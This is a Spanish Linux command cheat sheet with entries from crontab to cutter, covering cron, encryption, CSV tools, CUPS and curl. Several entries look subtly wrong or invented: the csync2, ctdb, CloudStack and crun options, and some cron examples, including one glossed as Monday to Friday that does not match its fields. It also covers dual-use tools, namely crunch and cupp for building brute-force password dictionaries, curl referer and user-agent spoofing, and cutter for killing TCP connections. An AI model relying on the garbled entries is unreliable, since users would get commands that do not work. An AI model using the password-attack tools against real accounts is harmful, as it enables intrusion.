configurar tareas para que se ejecuten automáticamente en el sistema
# crontab -e      (editar el archivo crontab, si no existe se crea)
$ crontab -e      (idem para el usuario no root)
# crontab -l       (Muestra el contenido para root)
# crontab -l -u usuario  (muestra el de usuario)
$ crontab -l       (idem para el usuario no root)
# crontab -r       (Borra el contenido de crontab)
Crontab consta de 6 campos separados por un espacio que indican:
minuto (0-59), hora (0-23), dia del mes (1-31), mes (1-12), dia de la semana (0-6, domingo=0), y comando a ejecutar. Un asterisco * como valor en los primeros cinco campos, indicará todos (todos los minutos, todas las horas ...)
	01 * * * *       (Se ejecuta el primer minuto de cada hora todos los dias)
	20 9 * * *       (a las 9:20 de la mañana todos los dias)
	20 21 * * *     (a las 9:20 (21:20) de la tarde todos los dias)
	01 6 * * 1      (a las 6:01 de todos los lunes)
	* * 1 1 *         (todos los minutos de todas las horas del 1 de enero)
	00 12 * * 0     (a las doce en punto de todos los domingos)
	@reboot (Cada reinicio)
También es posible especificar listas en los campos:
	01 15 * 1-4 1,2,3,4   (a las 3:01 de la tarde de lunes a viernes de enero a abril)
	*/15 * 1-15 *     (cada 15 minutos  entre el 1 y el 15 de todos los meses)
	*/5 * * * * cp /etc/resolv.conf.bak /etc/resolv.conf  (Ejecutar cada 5 minutos el comando especificado.)
	$ 0 8 * * * env DISPLAY=:0.0 vlc /home/usuario/musica/archivo.mp3 (Programar que cada dia a las 8 se abra un mp3 con el vlc)
El archivo donde se guardan las tareas a realizar es:
$ nano /var/spool/cron/usuario
También pueden añadirse o modificarse en este archivo.
1.-
En ocasiones, y especialmente con Archlinux, crontab cambia la codificación de caracteres de los scripts. Ejecutados directamente funcionan correctamente pero al colocarlos en el cron se muestran con caracteres estraños. La causa son las variables de entorno asociadas a la máquina y al demonio del cron. Para solucionar el problema:
# nano /etc/environment
Y añadir la linea:
LANG=es_ES.UTF-8
Reiniciar cron:
# /etc/rc.d/crond restart
2.-
Una forma de controlar si un script colocado en el cron funciona correctamente es:
$ env -i /home/user/script.sh
La condición de ejecución es similar a como lo hace cron.


cronutils
Utilidades para complementar la funcionalidad de cron facilitando la gestión y el control de trabajos programados. Incluye las herramientas runalarm, runlock y runstat
$ runalarm 10m backup.sh (ejecutar el script backup.sh 10 minutos después de invocarlo)
$ runlock /tmp/process_data.lock process_data.sh (si process_data.sh no debe ejecutarse si ya está en ejecución. /tmp/process_data.lock es un archivo de bloqueo [lock file] que runlock crea. Si alguien intenta ejecutar el script process_data.sh mientras ya está en ejecución, no podrá hacerlo hasta que termine de ejecutarse y el archivo de bloqueo se elimine)
$ runstat cleanup.sh (ejecutará el script y registrará información sobre cuánto tiempo tomó ejecutarlo y si tuvo éxito o falló)


cross-config
Proporciona configuraciones para arquitecturas cruzadas, diseñadas para facilitar el uso de herramientas como Autotools [autoconf, automake...] en entornos de compilación cruzada. La compilación cruzada implica compilar software en una arquitectura de máquina para que se ejecute en otra, por ejemplo, compilar en un sistema x86 para ARM o RISC-V.
Usar el archivo de configuración de cross-config al invocar un ./configure:
$ ./configure --host=arm-linux-gnueabi --build=x86_64-linux-gnu --with-sysroot=/usr/arm-linux-gnueabi (--host: Define la arquitectura destino, --build: Define la arquitectura del sistema en el que se trabaja y --with-sysroot: Especifica el sistema de archivos raíz para la arquitectura cruzada.)
$ ls /usr/share/cross-config/ (listar las configuraciones soportadas)
1.-
Compilación cruzada con Autotools. Si se está trabajando en un proyecto que usa autoconf y automake, primero generar el script de configuración:
$ autoreconf -i
Luego, configurar el proyecto utilizando una arquitectura cruzada:
$ ./configure --host=aarch64-linux-gnu --build=x86_64-linux-gnu
Y finalmente compilar el proyecto:
$ make


crudini
Utilidad que simplifica la lectura y actualización de archivos ini desde scripts de shell, llamada así porque proporciona funcionalidad CRUD [Create, Read, Update, and Delete]. Puede manejar la mayoría de las variantes de ini.
$ crudini --set config_file sección parameter valor (agregar/actualizar una variable)
$ crudini --set config_file "" parámetro valor (agregar/actualizar una variable en la raíz o área global, ss decir, que no esté bajo una [sección])
$ crudini --set --existing config_file seccion parameter valor (actualizar una variable existente)
$ crudini --set config_file section parameter1 value --set config_file section parameter2 value --del config_file section parameter3 (agregar/actualizar/eliminar múltiples variables)
$ crudini --set --list config_file section parameter a_value (agregar un valor a una lista separada por comas. Cualquier espacio en blanco alrededor de las comas se ignora)
$ crudini --set --list --list-sep= config_file section parameter a_value (agregar un valor a una lista separada por espacios en blanco. Se admiten listas de varias líneas ya que la nueva línea es un espacio en blanco)
$ crudini --del config_file section parameter (eliminar una variable)
$ crudini --del config_file section (eliminar una sección)
$ crudini --get config_file section parameter (generar un valor)
$ crudini --get config_file "" parameter (generar un valor global que no está en una sección)
$ crudini --get config_file section (generar una sección)
$ crudini --merge config_file < another.ini (fusionar un archivo ini desde otro ini)


cruft
Lista ficheros que presumiblemente sobran, faltan o están de alguna forma incorrectos, tomando principalmente la información de la base de datos de dpkg
# cruft -d /var/www
# cruft -r (Mostrar el informe)
# cruft --ignore /home/usuario (Descartando un directorio)


crun
Ejecutor de contenedores que sigue el formato OCI [Open Container Initiative]
$ crun create mycontainer (crear un contenedor)
$ crun r mycontainer (ejecutar un contenedor existente)
$ crun stop mycontainer (detener un contenedor en ejecución)
$ crun rm mycontainer (eliminar un contenedor)
$ crun list (listar todos los contenedores)
$ crun status mycontainer (verificar el estado de un contenedor)
$ crun config --memory=512 mycontainer (configurar opciones del contenedor, por ejemplo, limitaciones de recursos)


crunch
Generador de listas de palabras. Puede especificarse un conjunto de caracteres y admite números, símbolos, mayúsculas, minúsculas, caracteres por separado y Unicode.
$ crunch 6 6 0123456789abcdef -o 6caracteres.txt (generar palabras de un mínimo de 6 caracteres y máximo de 6 usando los especificados y guardandolo el el archivo menionado)
$ crunch 3 5 ABC$%& -o caracteres.txt (mínimo de 3 y máximo de 5 usando los epecificados)
$ crunch 4 5 -p mormo dama .com (usando permitaciónes de palabras especificadas.)


cryfs
Cifra archivos para almacénarlos en la nube como Dropbox, iCloud, OneDrive y otros.
$ cryfs --show-ciphers (cifrados disponibles)
Configurar un directorio cifrado:
       $ cryfs basedir mountdir
Hará algunas preguntas sobre la configuración del directorio cifrado. Decimos que sí a todo y a utilizar la configuración predeterminada. También solicitará una contraseña.
"mountdir" es el directorio en el que podremos trabajar como si fuera un directorio real [aunque sea virtual] y cryfs cifrará y almacenará el contenido en el directorio "basedir". Se puede trabajar en mountdir como en un directorios normal: agregarle archivos, modificarlos, agregar subdirectorios y hacer lo que quiera con él. Todo lo que se guarde dentro se encriptará y almacenará en basedir. El contenido no encriptado de mountdir nunca se almacenará en el disco duro, por lo que todo lo que se encuentre en el disco duro se encripta. CryFS utiliza un esquema de encriptación que no solo encripta el contenido de los archivos, sino que también se encriptan los tamaños de los archivos, los metadatos y la estructura del directorio.
Cuando se haya terminado de trabajar en el directorio "mountdir" creando archivos, subdirectorios o lo que proceda, para desmontar:
       $ fusermount -u mountdir
Con lo que cryfs ya no se estará ejecutando, lo que significa que ya no se podrá acceder a los datos como si el directorio de montaje estubiera vacío:
       $ ls mountdir
       [no hay salida porque el directorio está vacío]
Si volvemos a lanzar:
       $ cryfs basedir mountdir
Volveremos a disponer de todo lo que tengamos en "mountdir".


cryptmount
Utilidad para crear sistemas de archivos cifrados y que permite a un usuario común montar/desmontar sistemas de archivos sin requerir privilegios de superusuario.
# cryptmount-setup (configurar Cryptmount y crear un sistema de archivos encriptado )
$ cryptmount dir-secreto (acceder al dir cifrado. Pedirá contraseña)
$ cryptmount -u dir-seccreto (desmontar el dir cifrado)
$ cryptmount -l (listar todos los directorios cifrados)
$ cryptmount -c dir-secreto (cambiar la contraseña del dior cifrado)


cryptsetup
Cifrar con LUKS una partición. LUKS especifica un formato estándar en disco, independiente de plataforma.
# cryptsetup -y -v luksFormat /dev/sda3 (Pregunta la contraseña y confirmación para cifrar la partición. Borra todos los datos existentes [y] y modo verbose)
# cryptsetup luksOpen /dev/sda3 backup (Desencriptar. Inprescindible darle un nombre para el mapeo [backup])
Una vez entrada la contraseña asignada en el primer paso, escoger el formato según sistema [mkfs.vfat para fat32 o mkfs.ntfs para NTFS]:
# mkfs.ext4 /dev/mapper/backup -L cripta (con el nombre "cripta")
# cryptsetup luksClose backup (Cerrar la partición)
# cryptsetup -v status backup (ver el estado de la asignación)


cs
[CloudStack] Herramienta diseñado para implementar y administrar grandes redes de máquinas virtuales.
$ cs login (iniciar sesión en CloudStack)
$ cs status (verificar el estado general)
$ cs create zone --name=mi_zona --displaytext="Mi Zona" (crear una nueva zona)
$ cs create cluster --zoneid=<ID_ZONA> --name=mi_cluster --hypervisor=xen (rear un nuevo cluster)
$ cs create vm --clusterid=<ID_CLUSTER> --name=mi_vm --template=centos7_64 (agregar una nueva VM)
$ cs list zones (istar todas las zonas)
$ cs describe zone <ID_ZONA> (mostrar detalles de una zona específica)
$ cs delete zone <ID_ZONA> (eliminar una zona)
$ cs update (actualizar una zona)
$ cs tail /var/log/cloudstack/manager.log (verificar logs de CloudStack)


csh
El shell C fue escrito originalmente en UCB [University of California, Berkeley] para superar las limitaciones del shell Bourne. Su flexibilidad y comodidad lo convirtieron rápidamente en el shell de elección hasta que aparecieron shells más avanzados como ksh, bash, zsh o tcsh. La mayoría de estos últimos incorporan características originales de csh.


csmith
Herramienta que puede generar programas aleatorios en C que se ajustan estática y dinámicamente al estándar C99. Por lo tanto, es útil para probar compiladores, analizadores estáticos y otras herramientas que procesan código C.
$ csmith --seed 12345 > program.c (genera un programa aleatorio y lo guarda en program.c)
$ csmith --structs --arrays --pointers --functions --loops --void --float --restrict --variable-length-array (generar un programa con ciertas características específicas)


csplit
Dividir un archivo en varios archivos.
$ csplit -f seccion archivo.txt /capitulo/ {*} (que cada uno use el sufijo "capitulo" [capitulo00, capitulo01...],  que la division se produzca cuando encuentre la palabra "capitulo" y que haga todas las divisiones que precise)
$ csplit -n 4 archivo.txt 4 (El sufijo por defecto [xx] y que use 4 dígitos [xx0001, xx0002...] y parta en 4 archivos)
$ csplit -b %03d archivo.txt 3 (lo mismo con 3 dígitos y parta en 3 archivos [xx001, xx002...])
$ csplit archivo.txt 5 -f parte (Dividir en 5 archivos y cada uno con el sufijo "parte" [parte00, parte01...])
Nota.- para unirlo usar:
$ cat parte[0-5] > completo.txt


css2xslfo
Herramienta útil para convertir documentos XML estilizados con CSS2 en documentos XSL-FO, que posteriormente puedes procesar para obtener formatos como PDF o PostScript mediante un procesador XSL-FO como Apache FOP.
$ css2xslfo -i documento.xml -c estilo.css -o documento.fo (especifica el archivo .xml de entrada, la hoja de estilo CSS y define el archivo XSL-FO de salida)
$ css2xslfo -i documento.xml -c estilo1.css,estilo2.css -o documento.fo (aplicar más de una hoja de estilo CSS separadas por comas)
$ css2xslfo -i documento.xml -c estilo.css --dtd dtdarchivo.dtd -o documento.fo (especifica el archivo DTD para validación)
$ css2xslfo -i documento.xml -c estilo.css (ver el resultado XSL-FO directamente en la salida estándar [consola] sin escribirlo a un archivo [omitir la opción -o])
$ css2xslfo -i documento.xml -c estilo.css -o documento.fo --debug (habilitar mensajes de depuración para entender mejor los problemas durante la conversión)


csscapture
[python-cssutils]. Capturar el css de una web.
$ csscapture -s web http://www.tuxapuntes.com (guarda en la carpeta “web”)


cssmin
[python-cssmin python3-cssmin]. Algoritmo de compresión CSS [Cascading Style Sheet] de YUI [Yahoo User Interface]. El compresor se puede utilizar para reducir el tamaño de los documentos CSS para su implementación..
$ cssmin input.css > output.min.css (comprimir un archivo CSS existente y lo escribirá en output.min.css)
$ cssmin file1.css file2.css file3.css > combined.min.css (se comprimen varios archivos CSS y se combinan en uno solo)
$ cat input.css | cssmin > output.min.css (procesar el contenido de un archivo sin guardar primero en una variable intermedia)
$ cssmin input.css | less (mostrará el resultado de la compresión sin sobrescribir el archivo original)
$ cssmin input.css | uglifyjs -m > output.min.js (comprime el CSS y luego lo pasa por uglifyjs para minificarlo aún más)


csstidy
Analiza y optimiza el código CSS, haciéndolo más limpio y conciso. El resultado final es un archivo CSS más pequeño y un código mejor escrito.
$ csstidy estilos.css -o estilos_optimizados.css (forma básica)
$ csstidy estilos.css --test (mostrará el resultado optimizado en la consola sin crear un nuevo archivo)
1.-
Para una optimización más depurada, por ejemplo, que csstidy elimine comentarios y espacios en blanco, se puede especificar opciones en un archivo de configuración. Primero, crear un archivo de configuración:
$ nano ~/config.ini
con el siguiente contenido:
      [css]
      remove_last_underscore = true
      remove_empty_rules = true
      remove_comments = true
Luego, ejecutar csstidy usando este archivo de configuración:
$ csstidy estilos.css -o estilos_optimizados.css --config=~/config.ini


cstream0
Herramienta de manejo de flujo de uso general similar a dd [ver], que se utiliza generalmente en tuberías y compatibilidad con FIFO [First In, First Out]).
$ cstream -i archvo.txt -o duplicado.txt (duplicar un archivo)
$ cstream -n 1000000 -o salida.dat (genera un flujo de datos de 1 millón de bytes y lo escribe en salida.dat)
$ cstream -b 1024 -t 1000000 archivo.txt > salida.txt (lee archivo.txt con bloques de 1024 bytes y limita la velocidad de escritura a 1 megabyte por segundo)
$ mkfifo mi_fifo; cstream -i m_fifo -o tr_fifo & (crea dos FIFOs y usa cstream para conectarlos)
$ cstream -Oa -o /dev/dsp0 myhost.mydomain.com:17324 (conecta un servidor TCP en el puerto 17324 y envía audio CD a /dev/dsp0)
$ cstream -OD -o myfile (escribe a myfile usando O_DIRECT y O_SYNC, lo que puede ser útil para evitar buffering del sistema)
$ cat input_file | cstream -b 10000 | awk '{print $1}' (crear una tubería con "cstream" y "awk" para filtrar y transformar datos)


csvkit
Conjunto de herramientas para convertir, limpiar, transformar y analizar datos en formato CSV [Comma-Separated Values]. Incluye las herramientas csvclean, csvcut, csvformat, csvgrep, csvjoin, csvjson, csvlook, csvpy, csvsort, csvsql, csvstack, csvstat, in2csv y sql2csv
$ csvclean archivo.csv (elimina caracteres no válidos y correge problemas de formato y generará un nuevo archivo limpio, generalmente con un sufijo -clean en el nombre)
$ csvcut -c nombre_columna1,nombre_columna2 archivo.csv (mostrará solo las columnas especificadas)
$ csvformat -T archivo.csv (convertirá el archivo CSV en un archivo TSV [Tab-Separated Values])
$ csvgrep -c nombre_columna -m valor archivo.csv (mostrará solo las filas en las que nombre_columna tenga el valor especificado)
$ csvjoin -c columna_comun archivo1.csv archivo2.csv (combinará los archivos en función de columna_comun)
$ csvlook archivo.csv (presentará el contenido del archivo en una tabla en la terminal)
$ csvsort -c nombre_columna archivo.csv (ordenará el archivo según nombre_columna)
$ csvstat archivo.csv (mostrará estadísticas sobre cada columna en el archivo)
$ csvgrep -c nombre_columna -m valor archivo.csv | csvlook (filtrar y luego mostrar el resultado en formato tabular)


csvtool
Biblioteca para leer y escribir archivos CSV. También admite todas las extensiones utilizadas por Excel, por ejemplo, comillas, saltos de línea, caracteres de 8 bits en campos, etc.
$ csvtool col 1,3,5 input.csv > output.csv (Devuelve las columnas espcificadas de input.csv y la escribe en output.csv)
$ csvtool namedcol Account,Cost input.csv > output.csv (Suponiendo que la primera fila del .csv es una lista de encabezados de columnas, esto devuelve las columnas con los encabezados nombrados)
$ csvtool drop 1 input.csv > output.csv (para eliminar los encabezados de un archivo CSV)
$ csvtool drop 10 input.csv | csvtool take 10 - > output.csv (extraer las filas 11 a 20 de un archivo)
$ csvtool -t TAB -u COMMA cat input.tsv > output.csv (concatena los archivos de entrada y los escribe en la salida)
$ csvtool paste input1.csv input2.csv > output.csv (Concatena las columnas de los archivos y los escríbe en la salida)
$ csvtool pastecol 2-3 1- input.csv update.csv.csv > output.csv (Reemplazar el contenido de las columnas referenciadas en el archivo input.csv con el de la columna correspondiente especificada en update.csv)
$ csvtool square input.csv > input-square.csv (que las filas tengan la misma longitud)
$ csvtool trim tb input.csv (Recorta filas vacías en la parte superior e inferior)
Nota.- Otras opciones:
       t   - recorta filas vacías solo en la parte superior
       lr  - recorta columnas vacías a la izquierda y a la derecha
       tlrb- recorta filas/columnas vacías por todos lados


csync2
Sincroniza archivos en un clúster mediante el algoritmo rsync.
# csync2 --config /etc/csync2/csync2.cfg (ejecuta la sincronización completa basada en la configuración definida en /etc/csync2/csync2.cfg)
# csync2 --config /etc/csync2/csync2.cfg --exclude=*.tmp (excluye todos los archivos con extensión .tmp durante la sincronización)
# csync2 --config /etc/csync2/csync2.cfg --mode incremental (sincroniza solo los archivos modificados desde la última sincronización)
# csync2 --config /etc/csync2/csync2.cfg --status (muestra el estado actual de la sincronización y qué archivos están listos para ser transferidos)
# csync2 --config /etc/csync2/csync2.cfg --force (fuerza una sincronización completa ignorando la base de datos de archivos modificados)
# csync2 --config /etc/csync2/csync2.cfg --dir /home/user/documents (sincroniza solo el directorio /home/user/documents según la configuración)
# csync2 --config /etc/csync2/csync2.cfg --verbose (proporciona más detalles sobre el proceso de sincronización)
Nota.- En el archivo de configuración /etc/csync2/csync2.cfg es donde se definen los nodos participantes, las rutas de sincronización y otras opciones específicas.


ctb
[Cluster Trivial Database]. Implementación en clúster de la base de datos TDB [Trivial Database] que utilizan Samba y otros proyectos para almacenar datos temporales. Archivo de configuración en /etc/ctdb/ctdbd.conf.
# ctdbd --config (verificar la configuración actual)
# ctdb-tcpdump --clear-cache (limpiar el caché)
# ctdb-nodelist (mostrar información sobre nodos en el cluster)
# ctdb-recover (verificar el estado de replicación)
# systemctl status ctdb (verificar el estado del servicio)
# journalctl -u ctdb (verificar los logs de ctdb)


cthumb
Generar álbumes de imágenes web con miniaturas, temas y subtitulos. Además, te permite opcionalmente tener varias vistas de la colección de imágenes. Un álbum se compone de una serie de páginas, cada una compuesta por una colección de imágenes.
$ cthumb -c fotos/*.jpg > fotos.album
$ cthumb fotos.album
$ nano fotos.album
Para modificar los aspectos que se crea conveniente como:
- El título de la pagina [la linea siguiente de "Page: page"]
- AlbumTitle: Titulo del album
- Theme [los del directorio /usr/share/cthumb/]
Cada vez que se edita y modifica el archivo fotos.album ha de volver a lanzarse el comando:
$ cthumb fotos.album


cu
[Call UNIX]. Es una herramienta que se utiliza para comunicarse con otros sistemas, principalmente a través de conexiones de línea serial. Su función principal es actuar como un terminal para conectarse a otros dispositivos o sistemas, permitiendo la interacción con ellos como si se estuviera usando un terminal local. Además, también puede ser utilizado para transferir archivos simples.
$ cu -l /dev/ttyS0 -s 9600 (especifica el dispositivo de línea serial al que se desea conectar y la velocidad de conexión en baudios)
Una vez ejecutado este comando, se estará conectado al dispositivo /dev/ttyS0 y se podrá enviar y recibir datos como si se estuviera usando un terminal. Aunque cu no es la herramienta más común para transferencias de archivos debido a su falta de verificación de errores, puede usarse para enviar y recibir archivos de manera simple. Para enviar, por ejemplo, un archivo desde un sistema A a un sistema B conectado a través de un puerto serial, primero se abre cu en el sistema A:
$ cu -l /dev/ttyS0 -s 9600
Luego, utilizar el comando send dentro de cu para enviar el archivo:
sistema A> send archivo.txt
Para recibir un archivo eEn el sistema B, también se necesita estar en cu y se puede usar el comando receive:
sistema B> receive archivo.txt


cuetools
Herramientas para manipular archivos CUE/TOC. Estos archivos contienen información sobre la disposición de pistas en un CD, incluyendo tiempos de inicio, títulos, intérpretes, etc. Los archivos CUE y TOC son una forma de representar el diseño de un CD de datos o audio en un formato ASCII. El paquete incluye estas utilidades: cueconvert [convierte entre formatos CUE y TOC], cuebreakpoints [imprime los puntos de interrupción de un archivo CUE o TOC],
cueprint [imprime información de pista y disco para un archivo CUE o TOC] y cuetag [etiqueta archivos según la información del archivo CUE/TOC]
$ cue2toc archivo.cue > archivo.toc (crea un archivo archivo.toc con el mismo diseño del CD descrito en el archivo CUE)
$ toc2cue archivo.toc > archivo.cue (genera el archivo archivo.cue equivalente al archivo TOC)
$ cueprint -d "%p - %t\n" archivo.cue (imprimirá cada pista en el formato Intérprete - Título)
$ cuebreakpoints archivo.cue > breakpoints.txt (guarda los tiempos de división en el archivo breakpoints.txt)
$ cueconvert archivo.cue > archivo_convertido.toc (detecta automáticamente el formato de entrada y genera la salida en el otro formato)
$ cuebreakpoints archivo.cue | shnsplit -o flac archivo_audio.flac (dividirá el archivo de audio en archivos individuales correspondientes a las pistas descritas en el archivo CUE)


cumin
Herramienta scrita en python que ofrece un marco para ejecutar comandos en múltiples destinos de manera simultánea y eficiente. Es especialmente útil para la gestión de sistemas distribuidos, ya que permite realizar tareas masivas en varios servidores o máquinas.
$ cumin 'web_servers' 'hostname' (es un listar un grupo de destinos configurado en cumin, como un conjunto de servidores web y mostrando el nombre del host de cada máquina objetivo)
$ cumin 'databases' 'df -h' (ejecutar el comando df -h en cada uno de los sitemas en el grupo predefinido que representa varios servidores de bases de datos los destinos)
$ cumin 'A:group1 and R:region2' 'uptime' (selecciona todos los hosts en group1, selecciona hosts dentro de la región region2 y muestra cuánto tiempo ha estado en funcionamiento cada host)
$ cumin -t mosh 'all' 'ls /var/log' (cambia el método de transporte a mosh, una alternativa a SSH e indica que el comando se ejecuta en todos los sistemas configurados)
$ cumin --batch-size 10 'A:group2' 'echo "Batch execution"' (ejecuta el comando en lotes de 10 hosts a la vez en el grupo de destino A:group2)
$ cumin --input-file targets.txt 'uptime' (targets.txt contiene una lista de destinos)
$ cumin 'A:group3' 'whoami' > output.log (guardar salida en un archivo)
$ cumin 'A:admin_servers' 'bash -c "echo $(date) - Service restarted"' (ejecuta un comando de Bash en cada servidor administrador, mostrando la fecha y un mensaje personalizado)


cuneiform
Sistema de reconocimiento óptico de caracteres [Optical Character Reader - OCR] que se utiliza para extraer texto de imágenes o documentos escaneados. Además de reconocimiento de texto, también realiza análisis de diseño, lo que significa que puede manejar documentos con múltiples columnas, tablas, y otros elementos de diseño. Es compatible con una gran variedad de idiomas: inglés [rmg], francés [fra], alemán [ger], italiano [ita], portugués [por], español [spa]...
$ cuneiform -o salida.txt documento.png (extraer texto de una imagen llamada documento.png y guardarlo como texto plano en un archivo salida.txt)
$ cuneiform -l spa -o salida.txt documento.png (si el texto de la imagen está en español, especificar el idioma)
$ cuneiform -v -f html -o salida.html documento.png (obtener el texto con formato html y detallado)


cupp
[Common User Passwords Profiler]. Herramienta que puede generar un diccionario para ataques de fuerza bruta o ataques de diccionario con una lista de palabras a partir de información como un cumpleaños, apodo, dirección, nombre de una mascota o familiar, o una palabra común.
$ cupp3 -i (Realiza varias preguntas sobre cual es el nombre, el nik, el hijo... y al final crea un diccionario con los datos entrados .txt)
$ cupp3 -l (bajar el diccionario del idioma que se entre)


cups
Gestión de impresoras.
# cupsenable Hewlett-Packard-HP-LaserJet-Professional-P1606dn (Activar una impresora)
1.-
Montar una impresora en red:
En la máquina servidor (la que tiene conectada la impresora)
	# nano /etc/cups/cupsd.conf
Comentar la linea “Listen localhost:631” y añadir la ip de la máquina: “Listen 192.168.2.3:631” y en el siguiente apartado añadir los parámetros de la red:
	# Restrict access to the server…
	<Location />
		Order allow,deny
		Allow localhost
		Allow @LOCAL
		# permisos a la red local
		Allow from 192.168.2.0/24
	</Location>
Para activar la compartición de impresoras:
     Browsing on
     # /etc/init.d/cupsd restart (reiniciar cups)
Abrir el navegador y poner http://localhost:631 después del logeo ir a la pestaña printers y seleccionar la impresora, con lo que nos quedará en la barra de navegación algo parecido a:         http://localhost:631/printers/PSC-1100
Que sustituyendo “localhost” por la dirección ip de la máquina nos dará la dirección de la impresora:
http://192.168.2.3:631/printers/PSC-1100
En las máquinas cliente
	# nano /etc/cups/cupsd.conf
Browsing on
BrowseAllow 192.168.2.0/24
	# /etc/init.d/cupsys restart
Y configurar la impresora de la forma habitual ya sea en Sistema -> administración -> impresoras pestaña Configuración -> URI del dispositivo y poner la dirección de la impresora o via http://localhost:631
2.-
Que se muestre el nombre de usuario que imprime cada trabajo:
# nano /etc/cups/cupsd.conf
Substituir:
	JobPrivateValues default
Por:
	JobPrivateValues none


cupsaccept
Que una impresora acepte trabajos.
$ cupsaccept nombre_impresora


cupsdisable
Desactivar impresoras.
$ cupsdisable nombre_impresora


cupsenable
Activar impresoras.
$ cupsenable nombre_impresora


cupsreject
Que la impresora deje de aceptar trabajos.
$ cupsreject nombre_impresora


curl
Herramienta para la transferencia de datos desde o hacia un servidor. Permite los protocolos ftp, https, sftp, scp, tftp ...
$ curl ftp://host (Sin ninguna opción obtiene la páquina principal del host [http, ftp...)
$ curl ftp://host/ http://host/ (Descargar dos host simultaneos)
$ curl -o destino http://host (Guarda el host en destino)
$ curl -i URL (información sobre una URL)
$ curl -I URL (extraer todas las cabeceras)
$ curl -o portada.png http://www.lapipaplena.net/wp-content/uploads/2012/08/meditate1.png (descargar una imagen y guardarla)
$ curl -u usuario:contraseña http://localhost/restringido/ (Acceder a una zona que requiera autentificación)
$ curl ftp://usuario:contraseña@host:puerto/home/usuario/archivo (Otra forma de autentificación)
$ curl -T archivo_local ftp://host/carpeta (Subir un archivo local a un host remoto)
$ curl -T archivo_local -a ftp://host/ (Subir un archivo local a un host remoto con el parámetro -a)
$ curl -x proxy:8889 ftp://host (Obtener un host utilizando un proxy)
$ curl -u usuario:contraseña -x proxy:8888 http://host (Usando proxy y con autentificación)
$ curl -U usuario:contraseña -x proxy:8888 http://host (Cuando el proxy requiere autentificación especial)
$ curl -r 0-99 http://host (Obtener los primeros 100 bytes del documento)
$ curl -r -500 http://host (Obtener los últimos 500 bytes del documento)
$ curl --proxytunnel -x proxy:8888 -T archivo_local ftp ftp://host (Usando un tunel)
$ curl -v ftp://host (Ver información que se envia y recibe pero no los datos reales)
$ curl --trace trace.txt host (Obtener más información y guardar en trace.txt)
$ curl --dump-header headers.txt host (Guardar las cabeceras [cookies] en headers.txt)
$ curl -b headers.txt www.example.com (Pasar las cabeceras obtenidas a un host)
$ curl -e www.bueno.com http://host/ (Intentar engañar un site con una dirección falsa)
$ curl -A 'Mozilla/3.0 (Win95; I)' http://host (Intentar engañar un site especificando otro navegador)
$ curl --limit-rate 10K host (Limitar la velocidad de transferencia a 10 kilobytes)
$ curl -P 192.168.0.10 ftp host (Acceder a un host a partir de una ip a la que si tenemos acceso)
$ curl -C - -o descarga hots (Proseguir una descarga interrumpida)
$ curl -z local.html hots/remote.html (Sólo se efectuará la descarga si remote.html es más reciente que local.html)
Otras opciones:
$ curl -Is google.com | grep Date (Conocer la fecha via web)
$ curl ipinfo.io/183.61.164.202 (Conocer datos de una ip)
$ curl icanhazip.com (Conocer la IP externa)
$ curl ifconfig.me (lo mismo)
$ curl -u usuario:clave --silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if /<name>/; print "$2\n" if /<(title|name)>(.*)<\/\1>/;' (visualizar todos los mensajes no leidos de gmail)
$ curl -s 'http://geoiplookup.wikimedia.org/' | sed 's/^.*=\s*//' | python3 -mjson.tool (muestra la situación geográfica)
$ curl -s http://geoiplookup.wikimedia.org/ | python3 -c 'import sys, json, string, webbrowser; webbrowser.open(string.Template("http://maps.google.com/maps?q=$lat,$lon").substitute(json.loads(sys.stdin.read().split("=")[-1])))' (Lo mismo pero abriendo una pestaña en el navegador)
$ curl -s http://www.census.gov/popclock/data/population/world | awk -F'[:,]' '{print $7}' (Muestra el número de habitantes de la tierra)
$ curl -s https://help.github.com/articles/generating-ssh-keys | grep -Po  --color=never "RSA key fingerprint is (:?[A-z0-9]\:?){32}" (Imprime la clave RSA de github.com)
$ curl -s -w 'Test de velocidad para :%{url_effective}\n\nLookup Time:\t\t%{time_namelookup}\nConnect Time:\t\t%{time_connect}\nPre-transfer Time:\t%{time_pretransfer}\nStart-transfer Time:\t%{time_starttransfer}\n\nTotal Time:\t\t%{time_total}\n' -o /dev/null http://www.google.com (Tiempo de respuesta de un sitio web. Cambiar la url final)


curlftpfs
Montar directorios remotos en local.
# curlftpfs usuario:contraseña@192.168.1.10 /media/servidor
Para automatizar el proceso, añadir al /etc/fstab la linea:
curlftpfs#usuario:contraseña@192.168.1.10 /media/servidor fuse defaults 0 0


custodia
Herramienta utilizada para gestionar y almacenar secretos como claves, certificados, contraseñas de manera segura para aplicaciones distribuidas. Es útil para aplicaciones distribuidas y sin estado que utilizan un enfoque basado en archivos de imagen como imágenes basadas en contenedores. Pero también es útil para administrar la distribución de material clave en varias máquinas de una red.
$ custodia --config /etc/custodia/custodia.conf (ejecuta el servidor utilizando el archivo de configuración ubicado en /etc/custodia/custodia.conf)
$ custodia --config /etc/custodia/custodia.conf --add-secret my_secret "valor_del_secreto" (almacena el secreto identificado como my_secret con el valor proporcionado)
$ custodia --config /etc/custodia/custodia.conf --list-secrets (muestra las claves disponibles en el servidor Custodia)
$ custodia --config /etc/custodia/custodia.conf --verbose (genera información adicional sobre el estado y los errores encontrados)
1.-
El archivo de configuración se puede personalizar para especificar opciones como el almacenamiento de backend o los certificados utilizados. Por ejemplo:
# nano /etc/custodia/custodia.conf
       [main]
        listen = https://0.0.0.0:8000
        certfile = /etc/custodia/cert.pem
        keyfile = /etc/custodia/key.pem
       [secrets]
        backend = file
        path = /var/lib/custodia/secrets
Este archivo configura el servidor para escuchar en el puerto 8000 y utiliza un backend basado en archivos.


cut
Permite buscar y/o seleccionar columnas o campos dentro de un archivo estructurado. Entre campo y campo debe existir obligatoriamente un delimitador [dos puntos, un espacio en blanco u otro carácter].
$ cut -c1-4 archivo  (muestra los 4 primeros caracteres de cada linea)
$ cut -d: -f1 archivo  (Muestra el primer campo delimitado por “:”)
$ cut -d" " -f1,5 archivo  (Mostrar el primero y el quinto, separados por espacio)
$ cut -d" " -f 2- archivo (Mostrar todo menos la primera columna)
$ cut -s -d"(" -f1 archivo ("-s" suprime las lineas que no contengan el delimitador [(]). De las que sí lo contengan, mostraría el 1er campo)
$ echo $RANDOM | cut -c1,2 (Coger los 2 primeros números de un número aleatorio [$RANDOM])


cutter
Envia paquetes a ambos extremos de una conexión TCP/IP para cerrar la conexión. Está diseñado para desconectar conexiones no deseadas hacia o desde una dirección IP específica o par de direccioes IP o cerrar el servicio específico de un puerto.
